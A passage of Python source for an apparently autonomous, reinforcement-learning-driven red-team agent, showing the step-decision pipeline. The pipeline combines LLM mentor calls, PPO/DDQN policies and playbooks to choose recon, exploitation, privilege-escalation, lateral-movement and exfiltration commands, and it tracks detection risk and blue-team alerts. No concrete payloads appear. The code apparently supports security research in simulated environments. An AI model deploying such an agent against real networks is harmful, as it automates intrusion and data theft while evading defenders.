                confidence=_codex_conf,
                template_name=_chosen_name,
                params=params,
                reasoning=(
                    f"[CODEX-STRATEGIC] {_trigger}: step {step_num} in {current_phase.name}. "
                    f"Template={_chosen_name}. {_reason}"
                ),
                mentor_call=True,
                model_used="local-llm",
                mentor_reasoning=(
                    f"[CODEX-STRATEGIC] Plan repair → {_chosen_name}. "
                    f"Call {self._codex_strategic_calls_episode}/{self._codex_strategic_max_per_episode}"
                ),
                phase=current_phase,
            )
            return result
        except Exception as e:
            logger.debug(f"[CODEX-STRATEGIC][{self.agent_name}] Call failed: {e}")

        return None

    def _trace_stage(
        self, stage: str, result: str, score: float = 0.0, passed: bool = True
    ) -> None:
        """Phase 40: Record a decision pipeline stage for v6 dashboard trace."""
        if hasattr(self, '_decision_trace'):
            self._decision_trace.append({
                "stage": stage,
                "result": result[:80] if result else "",
                "score": round(score, 3),
                "passed": passed,
            })

    def decide(
        self,
        step_ctx: SmartStepContext,
        proposed_action: Optional[str] = None,
        confidence: Optional[float] = None,
        force_mentor: bool = False,
        decision_packet: Optional[Any] = None,
    ) -> SmartDecisionResult:
        """
        Make a smart decision using HYBRID mode: registry-first, GPT for strategy.
        
        HYBRID MODE LOGIC:
        1. Registry-first: Use command registry for 80% of decisions (token efficient)
        2. GPT called ONLY when:
           a) Phase transition detected (need strategic planning)
           b) Agent is stuck (repeated actions, needs new ideas)
           c) No valid registry commands match current state
           d) force_mentor=True passed explicitly
        
        Args:
            step_ctx: Step context with attack state
            proposed_action: Agent's proposed action (optional, may be overridden)
            confidence: Agent's confidence (0-1)
            force_mentor: Force GPT call regardless of other conditions
            
        Returns:
            SmartDecisionResult with command and full context
        """
        confidence = confidence if confidence is not None else 0.5
        ctx = step_ctx.attack_context
        
        # Phase 50: Store DecisionPacket reference for algorithm proposal population
        self._current_decision_packet = decision_packet

        # C03: SAC shadow select — off-policy observation of every step
        # C07: Gated by FF_SAC_SHADOW feature flag
        from core.feature_flags import get_feature_flags as _get_ff
        if _get_ff().sac_shadow:
            self._sac_shadow_select(step_ctx)

        # Phase 10.3: Collect reasoning events for dashboard visibility
        self._step_reasoning_log: List[Dict[str, Any]] = []
        # Phase 40: Decision chain trace for v6 dashboard
        self._decision_trace: List[Dict[str, Any]] = []
        # Phase 38 X3: Per-step LLM call counter — cap at 3 to prevent redundant calls
        self._step_llm_calls: int = 0
        _MAX_LLM_CALLS_PER_STEP = 3
        
        # =====================================================================
        # PHASE 6.9: CLOSEOUT HARD GATE
        # Once phase transitions to CLOSEOUT, ONLY closeout commands are allowed.
        # No recon, no exploitation, no scanning, no lateral movement.
        # This enforces real-world red-team discipline: exfil → cleanup → exit.
        # =====================================================================
        if ctx and ctx.current_phase == AttackPhase.CLOSEOUT:
            return self._decide_closeout_only(step_ctx)
        
        # =====================================================================
        # PHASE 11.0: STRICT PHASE LADDER GATE
        # Prevents phase-skipping by enforcing minimum steps per phase.
        # When enabled, commands targeting phases ahead of minimum completion
        # are replaced with phase-appropriate alternatives.
        # =====================================================================
        ladder_teaching = self._phase_ladder_gate(step_ctx)
        if ladder_teaching:
            self._step_reasoning_log.append({
                "event": "phase_ladder",
                "detail": ladder_teaching,
            })
        
        # =====================================================================
        # PHASE 15.0: NEUROMODULATOR COMPUTE (per-step)
        # Reads PPO entropy, parser confidence, hypothesis stats, reward
        # prediction error, stagnation, and detection risk to produce a
        # 4-dim neuromodulator state (DA, NE, ACh, 5-HT).
        # Feature-flag gated: FF_NEUROMODULATORS.
        # =====================================================================
        _p15_modulation: Dict[str, float] = {}
        if self._p15_neuromod_engine is not None:
            try:
                from core.neuro.neuromodulators import NeuromodulatorInputs
                # Gather inputs from available sources
                _p15_entropy = 0.5
                _p15_predicted_value = 0.0
                if self.ppo_agent and hasattr(self.ppo_agent, 'training_metrics'):
                    _ent_list = self.ppo_agent.training_metrics.get('entropy', [])
                    if _ent_list:
                        _raw_ent = _ent_list[-1]
                        _max_ent = max(0.01, self.ppo_agent.config.entropy_coef * 10)
                        _p15_entropy = min(1.0, _raw_ent / _max_ent)
                    _val_list = self.ppo_agent.training_metrics.get('values', [])
                    if _val_list:
                        _p15_predicted_value = _val_list[-1]
                # Evidence / hypothesis signals
                _p15_hyp_tested = 0
                _p15_hyp_confirmed = 0
                _p15_hyp_refuted_rate = 0.0
                _p15_evidence_delta = 0
                if self._p14_hypothesis_gen is not None:
                    try:
                        _stats = self._p14_hypothesis_gen.get_stats()
                        _p15_hyp_tested = _stats.get("tested", 0)
                        _p15_hyp_confirmed = _stats.get("confirmed", 0)
                        _total = max(1, _stats.get("total_created", 1))
                        _p15_hyp_refuted_rate = _stats.get("refuted", 0) / _total
                    except Exception:
                        pass
                if self._p14_evidence_graph is not None:
                    try:
                        _p15_evidence_delta = self._p14_evidence_graph.recent_delta()
                    except Exception:
                        pass
                _discovery_board = step_ctx.state.get("discovery_board", {})
                _p15_stag = getattr(self, '_stagnation_steps', 0)
                _p15_det_risk = 0.0
                if ctx and ctx.state_flags:
                    _p15_det_risk = ctx.state_flags.get("detection_risk", 0.0)
                _p15_reward = _discovery_board.get("last_reward", 0.0) if isinstance(_discovery_board, dict) else 0.0

                # Phase 16.0: Compute progress estimate and feed into neuromod
                _p16_progress_val = 0.5
                if self._p16_progress_estimator is not None:
                    try:
                        _p16_state_vec = step_ctx.state.get("_state_vector", [0.0] * 512)
                        _p16_est = self._p16_progress_estimator.estimate(
                            _p16_state_vec, _discovery_board
                        )
                        self._p16_progress_estimate = _p16_est
                        _p16_progress_val = _p16_est.combined
                        # Collect for end-of-episode labeling
                        self._p16_episode_states.append(list(_p16_state_vec[:512]))
                        self._p16_episode_boards.append(
                            {k: list(v) if isinstance(v, set) else v
                             for k, v in _discovery_board.items()}
                            if isinstance(_discovery_board, dict) else {}
                        )
                        logger.debug(
                            f"[P16] {self.agent_name}: fp={_p16_est.foothold_progress:.2f} "
                            f"rp={_p16_est.root_progress:.2f} delta={_p16_est.delta:.3f} "
                            f"conf={_p16_est.confidence:.2f} src={_p16_est.source}"
                        )
                    except Exception as e:
                        logger.debug(f"[P16] Progress estimate failed: {e}")

                _nm_inputs = NeuromodulatorInputs(
                    predicted_value=_p15_predicted_value,
                    realized_reward=_p15_reward,
                    policy_entropy=_p15_entropy,
                    confidence_min=confidence,
                    confidence_disagreements=0,
                    hypothesis_refuted_rate=_p15_hyp_refuted_rate,
                    hypothesis_confirmed_count=_p15_hyp_confirmed,
                    hypothesis_tested_count=_p15_hyp_tested,
                    evidence_delta=_p15_evidence_delta,
                    replan_count=0,
                    steps_since_progress=_p15_stag,
                    detection_risk=_p15_det_risk,
                    progress_estimate=_p16_progress_val,
                )
                self._p15_neuromod_state = self._p15_neuromod_engine.compute(
                    _nm_inputs, self._p15_neuromod_state,
                )
                if self._p15_neuromod_history is not None:
                    self._p15_neuromod_history.record(self._p15_neuromod_state)
                _p15_modulation = self._p15_neuromod_engine.apply_modulation(
                    self._p15_neuromod_state
                )
                logger.debug(
                    f"[P15][NEUROMOD] {self.agent_name}: "
                    f"DA={self._p15_neuromod_state.da:.2f} NE={self._p15_neuromod_state.ne:.2f} "
                    f"ACh={self._p15_neuromod_state.ach:.2f} 5HT={self._p15_neuromod_state.sht:.2f}"
                )
                self._step_reasoning_log.append({
                    "event": "neuromod",
                    "state": self._p15_neuromod_state.to_dict(),
                })
            except Exception as e:
                logger.debug(f"[P15] Neuromod compute failed: {e}")

        # ── Phase 15.0: Apply neuromodulation to PPO ─────────────────
        if _p15_modulation and self.ppo_agent is not None:
            try:
                self.ppo_agent.apply_neuromodulation(
                    entropy_coef_mult=_p15_modulation.get("entropy_coef_mult", 1.0),
                    lr_mult=_p15_modulation.get("lr_mult", 1.0),
                    bc_weight_mult=_p15_modulation.get("bc_weight_mult", 1.0),
                )
            except Exception as e:
                logger.debug(f"[P15] PPO neuromod apply failed: {e}")

        # =====================================================================
        # PHASE 15.0: AGGRESSION CONTROLLER (per-step)
        # Computes bounded aggression level [0, 1] from neuromod state, phase,
        # recent success/failure, and detection risk.
        # Feature-flag gated: FF_AGGRESSION_CONTROLLER.
        # =====================================================================
        if self._p15_aggression_controller is not None:
            try:
                from core.neuro.aggression_controller import AggressionInputs
                _da = self._p15_neuromod_state.da if self._p15_neuromod_state else 0.5
                _sht = self._p15_neuromod_state.sht if self._p15_neuromod_state else 0.5
                _ne = self._p15_neuromod_state.ne if self._p15_neuromod_state else 0.3
                _discovery_board_agg = step_ctx.state.get("discovery_board", {})
                _current_phase_name = (
                    ctx.current_phase.name if ctx and hasattr(ctx.current_phase, 'name')
                    else "RECON"
                )
                _shell = bool(_discovery_board_agg.get("shells", []))
                _det_risk = 0.0
                if ctx and ctx.state_flags:
                    _det_risk = ctx.state_flags.get("detection_risk", 0.0)
                _agg_inputs = AggressionInputs(
                    phase=_current_phase_name,
                    da_level=_da,
                    sht_level=_sht,
                    ne_level=_ne,
                    recent_successes=0,
                    recent_failures=0,
                    steps_since_progress=getattr(self, '_stagnation_steps', 0),
                    shell_obtained=_shell,
                    detection_risk=_det_risk,
                )
                _agg_state = self._p15_aggression_controller.compute(_agg_inputs)
                _agg_state.step = step_ctx.step
                self._p15_aggression_level = _agg_state.level
                if self._p15_aggression_history is not None:
                    self._p15_aggression_history.record(_agg_state)
                logger.debug(
                    f"[P15][AGGR] {self.agent_name}: level={_agg_state.level:.2f} "
                    f"reasons={_agg_state.reason_codes}"
                )
            except Exception as e:
                logger.debug(f"[P15] Aggression compute failed: {e}")

        # =====================================================================
        # PHASE 15.0: REFLEX POLICY (pre-cascade override)
        # Deterministic fast override before any action selection. Checks
        # detection risk, aggression, confidence, etc. If reflex fires,
        # returns immediately with a safe command — no cascade needed.
        # Feature-flag gated: FF_REFLEX_POLICY.
        # =====================================================================
        if self._p15_reflex_policy is not None:
            try:
                from core.neurorouter.reflex_policy import ReflexContext
                _ne_lvl = self._p15_neuromod_state.ne if self._p15_neuromod_state else 0.3
                _det_risk_ref = 0.0
                _blue_alert = 0.0
                if ctx and ctx.state_flags:
                    _det_risk_ref = ctx.state_flags.get("detection_risk", 0.0)
                    _blue_alert = ctx.state_flags.get("blue_team_alert", 0.0)
                _current_phase_ref = (
                    ctx.current_phase.name if ctx and hasattr(ctx.current_phase, 'name')
                    else "RECON"
                )
                _reflex_ctx = ReflexContext(
                    detection_risk=_det_risk_ref,
                    blue_team_alert=_blue_alert,
                    last_command_failed=False,
                    last_command_noisy=False,
                    confidence_min=confidence,
                    unverified_findings=0,
                    evidence_gaps=0,
                    steps_since_discovery=getattr(self, '_stagnation_steps', 0),
                    aggression_level=self._p15_aggression_level,
                    ne_level=_ne_lvl,
                    repeated_failures=0,
                    phase=_current_phase_ref,
                )
                _reflex_override = self._p15_reflex_policy.evaluate(_reflex_ctx)
                if _reflex_override.triggered:
                    _reflex_cmd = self._p15_reflex_policy.get_reflex_command(
                        _reflex_override, _current_phase_ref
                    )
                    if _reflex_cmd:
                        _target = ctx.target if ctx else "10.0.0.1"
                        _reflex_cmd = _reflex_cmd.replace("{target}", _target)
                        _action_val = getattr(_reflex_override.action, 'value', 'unknown')
                        logger.info(
                            f"[P15][REFLEX] {self.agent_name}: {_action_val} → "
                            f"'{_reflex_cmd[:60]}' (rule={_reflex_override.source_rule})"
                        )
                        self._step_reasoning_log.append({
                            "event": "reflex",
                            "action": _action_val,
                            "rule": _reflex_override.source_rule,
                        })
                        return SmartDecisionResult(
                            command=_reflex_cmd,
                            template_name="reflex_override",
                            source="reflex",
                            confidence=_reflex_override.confidence,
                            reasoning=f"Reflex: {_reflex_override.reason}",
                        )
            except Exception as e:
                logger.debug(f"[P15] Reflex eval failed: {e}")

        # =====================================================================
        # PHASE 15.0: WORKING MEMORY UPDATE (per-step)
        # Advance step counter (evicts expired slots), push current phase and
        # recent discoveries as bounded slots. Provides context to downstream
        # mentor prompts via to_prompt_fragment().
        # Feature-flag gated: FF_WORKING_MEMORY.
        # =====================================================================
        if self._p15_working_memory is not None:
            try:
                self._p15_working_memory.step(step_ctx.step)
                _current_phase_wm = (
                    ctx.current_phase.name if ctx and hasattr(ctx.current_phase, 'name')
                    else "RECON"
                )
                # Push current phase
                self._p15_working_memory.push(
                    key="phase",
                    content=f"Phase: {_current_phase_wm}, step {step_ctx.step}",
                    slot_type="subgoal",
                    priority=0.8,
                )
                # Push discovery state summary
                _disc_bd = step_ctx.state.get("discovery_board", {})
                _disc_ports = len(_disc_bd.get("ports", []))
                _disc_creds = len(_disc_bd.get("credentials", []))
                _disc_shells = len(_disc_bd.get("shells", []))
                if _disc_ports or _disc_creds or _disc_shells:
                    self._p15_working_memory.push(
                        key="discoveries",
                        content=f"ports={_disc_ports} creds={_disc_creds} shells={_disc_shells}",
                        slot_type="evidence",
                        priority=0.7,
                        numeric_features=[float(_disc_ports), float(_disc_creds), float(_disc_shells)],
                    )
                logger.debug(
                    f"[P15][WM] {self.agent_name}: slots={len(self._p15_working_memory)} "
                    f"step={step_ctx.step}"
                )
            except Exception as e:
                logger.debug(f"[P15] Working memory update failed: {e}")

        # ─── PHASE 5.2+: Skill Library query ────────────────────────
        # Before main pipeline, check if skill library has a high-confidence match
        skill_result = self._query_skill_library(step_ctx)
        
        # ─── PHASE 4: Playbook curriculum (annealing) ────────────────
        # Early episodes: follow proven playbooks. Later: let PPO/registry drive.
        playbook_result = self._playbook_suggest(step_ctx)
        if playbook_result is not None:
            # Still apply anti-repeat guard below
            # but return playbook suggestion as primary choice
            pass  # Will be checked below after anti-repeat
        
        # Track previous phase for transition detection
        prev_phase = getattr(self, '_last_phase', None)
        current_phase = ctx.current_phase
        self._last_phase = current_phase

        # R49/R52: Track consecutive steps in PRIV_ESC and LATERAL_MOVEMENT
        # for escalation shortcuts. Both phases can grind without progress.
        if current_phase == AttackPhase.PRIVILEGE_ESCALATION:
            self._privesc_steps = getattr(self, '_privesc_steps', 0) + 1
        elif getattr(self, '_privesc_steps', 0) > 0:
            # Phase changed away from PRIV_ESC — reset
            self._privesc_steps = 0
        
        # R52: Track LATERAL_MOVEMENT steps for forced root escalation
        if current_phase == AttackPhase.LATERAL_MOVEMENT:
            self._lateral_steps = getattr(self, '_lateral_steps', 0) + 1
        elif getattr(self, '_lateral_steps', 0) > 0:
            self._lateral_steps = 0
        
        # =====================================================================
        # PHASE 6.2: MENTOR CONTROLLER — 3-tier budget+fade with triggers
        # Replaces Phase 6.1 hard 3-condition gating.
        # MentorController evaluates: uncertainty, stagnation, phase transition,
        # EXFIL curriculum gate, warmup, budget floor.
        # Returns MentorEngagement with tier, model, and guidance flags.
        # =====================================================================
        should_call_gpt = False
        gpt_reason = None
        mentor_engagement: Optional[MentorEngagement] = None
        
        if self.mentor_controller is not None:
            # Phase 38 X2: Sync stagnation counter to SmartCoach's canonical value
            self.mentor_controller._stagnation_steps = getattr(self, '_stagnation_steps', 0)
            # Use the new 3-tier controller
            phase_changed = (prev_phase is not None and current_phase != prev_phase)
            # Phase 9.0: Pass DDQN confidence for macro-uncertainty trigger
            _ddqn_conf = None
            if hasattr(self, 'ddqn_macro') and self.ddqn_macro is not None:
                try:
                    _ddqn_conf = self.ddqn_macro.get_confidence_metrics()
                except Exception:
                    pass
            mentor_engagement = self.mentor_controller.should_engage(
                confidence=confidence,
                phase_changed=phase_changed,
                prev_phase=prev_phase.name if prev_phase is not None else None,
                current_phase=current_phase.name,
                force=force_mentor,
                ddqn_confidence=_ddqn_conf,
            )
            if mentor_engagement.engage:
                should_call_gpt = True
                gpt_reason = f"{mentor_engagement.trigger.value}:{mentor_engagement.reason}"
                # Phase 7.3: Do NOT reset stagnation on mentor call — only reset on
                # actual discoveries (record_result). This prevents the stagnation→mentor→
                # reset→stagnation cycle where mentor fires every 4 steps but nothing
                # actually advances.
        else:
            # Fallback: legacy 3-condition gating (Phase 6.1 compat)
            stagnation_steps = getattr(self, '_stagnation_steps', 0)
            
            if prev_phase is not None and current_phase != prev_phase:
                should_call_gpt = True
                gpt_reason = f"phase_transition:{prev_phase.name}->{current_phase.name}"
                self._stagnation_steps = 0
            elif stagnation_steps > 5 and self.reward_calculator.is_stuck():
                should_call_gpt = True
                gpt_reason = f"hard_stagnation(steps={stagnation_steps})"
                self._stagnation_steps = 0
            elif force_mentor:
                should_call_gpt = True
                gpt_reason = "forced_mentor"
        
        # =================================================================
        # PHASE 11.0: ADAPTIVE BUDGET GATE
        # After MentorController decides engagement intent, enforce hard
        # budget limits via AdaptiveBudgetController.can_call_mentor().
        # This preserves intent tracking while preventing budget overrun.
        # Runs AFTER both controller and legacy paths have set should_call_gpt.
        # =================================================================
        if should_call_gpt and self.budget_controller is not None:
            _phase_name = current_phase.name if hasattr(current_phase, 'name') else str(current_phase)
            _stag = getattr(self, '_stagnation_steps', 0)
            if not self.budget_controller.can_call_mentor(_phase_name, stagnation_steps=_stag):
                _pressure = self.budget_controller.get_pressure()
                should_call_gpt = False
                gpt_reason = f"budget_throttled(pressure={_pressure:.0%},phase={_phase_name})"
                logger.debug(
                    f"[{self.agent_name}] Budget gate: mentor suppressed — "
                    f"pressure={_pressure:.2f}, phase={_phase_name}"
                )
                self._step_reasoning_log.append({
                    "type": "budget_throttle",
                    "agent": self.agent_name,
                    "message": f"📊 Budget pressure {_pressure:.0%} — mentor call suppressed for phase {_phase_name}",
                })
        
        # Check if GPT is available
        gpt_available = (
            self.smart_mentor is not None
            and self.gpt_manager is not None
            and not self.gpt_manager.is_offline()
        )
        
        # Pre-compute filtered commands for this agent's role
        valid_commands = get_valid_commands_for_state(ctx.state_flags, ctx.current_phase)
        if not valid_commands:
            valid_commands = get_valid_commands_for_state(ctx.state_flags)
        if not valid_commands:
            valid_commands = [
                cmd for cmd in COMMAND_REGISTRY.values()
                if cmd.phase == AttackPhase.RECON and not cmd.preconditions
            ]
        filtered_commands = self._filter_commands_for_role(valid_commands)
        
        # =====================================================================
        # PHASE 7.1: FORWARD-ONLY PHASE GATE + EXPLOITED-SERVICE FILTER
        # 1. Remove commands from phases BEHIND current phase
        # 2. Remove exploit commands targeting already-exploited services
        # 3. Inject exploited_services from discovery_board into ctx for filtering
        # =====================================================================
        
        # Inject exploited-service info from discovery_board (passed via state_flags)
        discovery_board = step_ctx.state.get("discovery_board", {})
        if discovery_board:
            ctx.state_flags["_exploited_services"] = discovery_board.get("exploited_services", set())
            ctx.state_flags["_exploited_ports"] = discovery_board.get("exploited_ports", set())
        
        # Apply forward-only phase gating
        filtered_commands = self._filter_phase_forward(filtered_commands, current_phase)
        
        # Apply exploited-service filtering
        filtered_commands = self._filter_exploited_services(filtered_commands, ctx)
        
        # Phase 7.2: Remove brute-force commands when credentials already known
        filtered_commands = self._filter_creds_aware(filtered_commands, ctx)
        
        # =====================================================================
        # PHASE 10.1: PRIVILEGE GATING
        # Remove commands requiring sudo/root when agent hasn't earned those
        # privileges yet. Controlled by FF_PRIVILEGE_GATING feature flag.
        # =====================================================================
        filtered_commands = self._filter_by_privilege(filtered_commands, step_ctx.state)
        
        # =====================================================================
        # PHASE 9.4: EXECUTIVE CORTEX STRATEGIC GUIDANCE
        # Query the ExecutiveCortex for current phase objectives and recommended
        # commands. Use this to boost priority of strategically-relevant commands
        # in the filtered list. This creates top-down strategic pressure without
        # hard-overriding the decision pipeline.
        # =====================================================================
        _exec_guidance = None
        if self.executive_cortex is not None:
            try:
                _exec_phase_name = (
                    current_phase.name if hasattr(current_phase, 'name')
                    else str(current_phase)
                )
                _exec_guidance = self.executive_cortex.get_phase_guidance(
                    current_phase=_exec_phase_name,
                    step=step_ctx.step,
                )
                if _exec_guidance and _exec_guidance.get("recommended_commands"):
                    # Boost recommended commands to front of filtered list
                    _recommended = set(_exec_guidance["recommended_commands"])
                    _boosted = [c for c in filtered_commands if c.name in _recommended]
                    _rest = [c for c in filtered_commands if c.name not in _recommended]
                    filtered_commands = _boosted + _rest
                    logger.debug(
                        f"[{self.agent_name}] ExecutiveCortex guidance: "
                        f"phase={_exec_phase_name}, focus={_exec_guidance.get('focus', '?')}, "
                        f"boosted={len(_boosted)} commands"
                    )
            except Exception as e:
                logger.debug(f"[{self.agent_name}] ExecutiveCortex guidance error: {e}")
        
        # Store discovery board reference for TacticalCortex
        self._last_discovery_board = step_ctx.state.get("discovery_board", {})
        
        # =====================================================================
        # PHASE 9.0: DDQN MACRO-INTENT SELECTION
        # Before PPO picks a concrete command, DDQN picks the strategic
        # macro-intent (RECON_FOCUS, CREDENTIAL_CHAIN, SERVICE_EXPLOIT, etc.)
        # PPO is then constrained to commands within that macro-intent.
        # This creates a natural hierarchy: DDQN=strategy, PPO=tactics.
        # =====================================================================
        self._active_macro = None
        self._active_macro_q = None
        self._ddqn_confidence = 0.0
        self._ddqn_pending = None
        
        if self.ddqn_macro is not None:
            try:
                import torch as _torch
                _, _, _, encode_state = _lazy_ppo()
                if encode_state is not None:
                    state_dict = step_ctx.state if step_ctx.state else {}
                    state_tensor = encode_state(
                        state_dict, _torch.device("cpu"),
                        current_step=step_ctx.step,
                        max_steps=250,
                    )
                    phase_name = current_phase.name if current_phase else "RECON"
                    # R57 Layer 1: Pass discovery signal for stagnation detection
                    _had_disc = getattr(self, '_last_step_had_discovery', False)
                    # Phase 9.5: Pass step_id for per-step dedup (prevents double epsilon decay)
                    _step_id = step_ctx.step if step_ctx else None
                    macro, q_values, confidence = self.ddqn_macro.select_macro(
                        state_tensor, phase_name,
                        had_discovery=_had_disc,
                        step_id=_step_id,
                    )
                    self._active_macro = macro
                    self._active_macro_q = q_values
                    self._ddqn_confidence = confidence
                    self._ddqn_pending = {
                        "state": state_tensor,
                        "macro": macro.value,
                        "prev_macro": self._ddqn_prev_macro,  # R57 Layer 1: track for switch penalty
                    }
                    self._ddqn_prev_macro = macro.value  # R57: remember for next step
                    logger.debug(
                        f"[DDQN][{self.agent_name}] Macro={macro.name} "
                        f"conf={confidence:.2f} ε={self.ddqn_macro.epsilon:.3f}"
                    )
                    # Phase 50: Populate DDQN macro on DecisionPacket
                    _dp = getattr(self, '_current_decision_packet', None)
                    if _dp is not None:
                        _dp.ddqn.macro_idx = macro.value
                        _dp.ddqn.q_value = float(q_values.max()) if q_values is not None else 0.0
                        _dp.ddqn.macro_name = macro.name
                        _dp.ddqn.confidence = float(confidence)
            except Exception as e:
                logger.debug(f"[DDQN][{self.agent_name}] Macro select failed: {e}")
        
        # Make decision based on hybrid logic
        # PHASE 6.4: MENTOR-FIRST → PPO-TAKEOVER pipeline
        # Early episodes: mentor leads, PPO observes (builds demonstration buffer).
        # Later episodes: PPO leads, mentor only called on uncertainty/stagnation.
        # The crossover is controlled by a dynamic mentor_lead_rate that fades
        # from 35% to 15% as PPO builds confidence (Phase 6.5 tuning).
        # 
        # Decision priority: Skill Library → Playbook → CODEX STRATEGIC → CODEX TACTICAL → CognitionNode → (Mentor OR PPO) → Registry
        
        # =====================================================================
        # R66: ENTROPY GATING — CONSOLIDATED via MaturityController
        # Previously mutated ppo._entropy_adaptive_multiplier directly.
        # Now: MaturityController is the SOLE entropy authority.
        # SmartCoach only signals exploration boost REQUEST (not direct write).
        # =====================================================================
        if self.ppo_agent is not None and self._maturity_controller is not None:
            _coh = self._r66_coherence
            _mconf = self._r66_macro_conf
            if _coh < 0.30:
                self._maturity_controller.request_exploration_boost(
                    reason=f"low_coherence_{_coh:.2f}",
                    magnitude=0.4,
                    duration_episodes=3,
                )
            # High coherence needs no action — MaturityController handles natural decay
        elif self.ppo_agent is not None:
            # Legacy fallback when MaturityController not wired
            _coh = self._r66_coherence
            _mconf = self._r66_macro_conf
            if _coh < 0.30:
                self.ppo_agent._entropy_adaptive_multiplier = min(
                    2.0, self.ppo_agent._entropy_adaptive_multiplier * 1.4
                )
            elif _coh > 0.65 and _mconf > 0.70:
                self.ppo_agent._entropy_adaptive_multiplier = max(
                    0.5, self.ppo_agent._entropy_adaptive_multiplier * 0.85
                )
        
        # =====================================================================
        # LAYER 2.5: MICRO-CHAIN — Phase 27 nano→mini→nano scoring
        # Runs BEFORE codex meta-layer. If it returns a result, it takes
        # priority over codex meta (but not over skill/playbook/web_followup).
        # =====================================================================
        micro_chain_result = None
        if self._micro_chain is not None:
            try:
                _mc_templates = [c.name for c in filtered_commands[:20]] if filtered_commands else []
                _mc_recent = list(self.episode_used_commands)[-10:] if self.episode_used_commands else []
                _mc_stag = getattr(self, '_stagnation_steps', 0)  # Phase 38: fix stagnation pass-through
                _mc_role = self.agent_role.get("role", self.agent_name) if isinstance(self.agent_role, dict) else str(self.agent_role or self.agent_name)
                _mc_out = self._micro_chain.decide(
                    phase=current_phase.name if hasattr(current_phase, 'name') else str(current_phase),
                    discovery_board=discovery_board,
                    recent_commands=_mc_recent,
                    available_templates=_mc_templates,
                    agent_role=_mc_role,
                    stagnation_steps=_mc_stag,
                )
                if _mc_out is not None and _mc_out.selected.command:
                    _mc_source = "micro_chain_codex" if _mc_out.escalated else "micro_chain"
                    # P37: Store raw result for LLMPolicyBridge
                    self._p37_last_mc_result = _mc_out
                    micro_chain_result = SmartDecisionResult(
                        command=_mc_out.selected.command,
                        confidence=_mc_out.selected.score,
                        reasoning=_mc_out.selected.reasoning,
                        source=_mc_source,
                        template_name=_mc_out.selected.template_name,
                        tokens_used=_mc_out.chain_tokens,
                        model_used=_mc_out.model_trace,
                        mentor_call=True,
                    )
                    logger.debug(
                        f"[MICRO-CHAIN][{self.agent_name}] Selected: "
                        f"{_mc_out.selected.command[:60]} (score={_mc_out.selected.score:.2f}, "
                        f"escalated={_mc_out.escalated})"
                    )
                    # Phase 38 X3: Count MicroChain as 1-3 LLM calls (stages)
                    self._step_llm_calls += 2 if not _mc_out.escalated else 3
            except Exception as e:
                logger.debug(f"[MICRO-CHAIN][{self.agent_name}] Error: {e}")

        # =====================================================================
        # LAYER 2.7: PHASE-GUIDED LLM — Phase 34 structured guidance
        # Produces evidence-driven phase advice + candidate commands.
        # Runs after MicroChain. If MicroChain didn't fire AND phase guide
        # returns candidates, they supplement the pipeline.
        # =====================================================================
        phase_guided_result = None
        if micro_chain_result is None and self._phase_guided is not None:
            try:
                _pg_phase = current_phase.name if hasattr(current_phase, 'name') else str(current_phase)
                _pg_stag = getattr(self, '_stagnation_steps', 0)  # Phase 38: fix stagnation pass-through
                _pg_templates = [
                    {"name": c.name, "phase": c.phase.name if hasattr(c.phase, 'name') else str(c.phase)}
                    for c in (filtered_commands[:15] if filtered_commands else [])
                ]
                _pg_result = self._phase_guided.guide(
                    episode_id=str(getattr(self, 'current_episode', 0)),
                    step_id=step_ctx.step if hasattr(step_ctx, 'step') else 0,
                    agent_role=self.agent_name,
                    current_phase=_pg_phase,
                    phase_state={
                        "stagnation_steps": _pg_stag,
                        "recent_discovery_deltas": [],
                    },
                    discovery_board=discovery_board,
                    available_templates=_pg_templates,
                )
                if _pg_result is not None and _pg_result.selections:
                    _pg_best = _pg_result.selections[0]
                    # P37: Store raw result for LLMPolicyBridge
                    self._p37_last_pg_result = _pg_result
                    phase_guided_result = SmartDecisionResult(
                        command=_pg_best.template_name,  # Template name as command hint
                        confidence=_pg_result.phase_decision.confidence,
                        reasoning=f"phase_guided: {_pg_result.phase_decision.reasoning[:120]}",
                        source="phase_guided",
                        template_name=_pg_best.template_name,
                        mentor_call=True,
                    )
                    logger.debug(
                        f"[PHASE-GUIDE][{self.agent_name}] Guided: "
                        f"{_pg_best.template_name} (conf={_pg_result.phase_decision.confidence:.2f})"
                    )
                    # Phase 38 X3: Track PhaseGuided LLM call
                    self._step_llm_calls += 1
                    self._step_reasoning_log.append({
                        "type": "phase_guided",
                        "agent": self.agent_name,
                        "message": f"P34 guidance: {_pg_best.template_name} ({_pg_result.phase_decision.reasoning[:80]})",
                    })
            except Exception as e:
                logger.debug(f"[PHASE-GUIDE][{self.agent_name}] Error: {e}")

        # =====================================================================
        # LAYER 3: CODEX META-LAYER — Tactical + Strategic stagnation-breaking
        # Phase 8: Uses persona router when available for typed reasoning.
        # Codex-tactical: phase-level stagnation (existing _codex_meta_check)
        # Codex-strategic: episode-level plan repair (R66 new)
        # =====================================================================
        codex_meta_result = self._codex_meta_check(
            step_ctx, current_phase, filtered_commands
        )
        # R66: If tactical didn't fire, try strategic
        if codex_meta_result is None:
            codex_meta_result = self._codex_strategic_check(
                step_ctx, current_phase, filtered_commands
            )
        
        # =====================================================================
        # LAYER 3.5: COGNITION NODE — Multi-brain fusion (C04 re-enabled)
        # Fuses PPO, SAC, DDQN votes via learned confidence gate.
        # Produces cognition_decision only if confidence > 0.5.
        # =====================================================================
        self._cognition_result = None  # Reset per-step
        cognition_decision = None
        if self.cognition_node is not None:
            try:
                import torch as _cog_torch
                from core.models.state_encoder import encode_state as _cog_encode
                _cog_state = _cog_encode(
                    step_ctx.state, _cog_torch.device("cpu"),
                    current_step=step_ctx.step, max_steps=500,
                )
                _cog_mask = _cog_torch.ones(
                    self.action_mapper.action_dim if self.action_mapper else 79,
                    dtype=_cog_torch.bool,
                )
                _cog_result = self.cognition_node.think(
                    _cog_state, _cog_mask, phase=current_phase.name,
                    step_id=step_ctx.step,
                )
                self._cognition_result = _cog_result

                # Populate DecisionPacket cognition vote
                _dp = self._current_decision_packet
                if _dp is not None:
                    _dp.cognition.winning_brain = _cog_result.winning_brain
                    _dp.cognition.fused_confidence = _cog_result.confidence
                    _dp.cognition.action_idx = _cog_result.action_idx
                    _dp.cognition.brain_votes = len(_cog_result.votes)

                # Only produce decision if confidence >= 0.5 AND we have a valid action
                if (_cog_result.confidence >= 0.5
                        and _cog_result.action_idx >= 0
                        and self.action_mapper is not None):
                    _cog_template = self.action_mapper.action_to_command(_cog_result.action_idx)
                    if _cog_template is not None:
                        cognition_decision = SmartDecisionResult(
                            command=_cog_template.template,
                            template_name=_cog_template.name,
                            confidence=_cog_result.confidence,
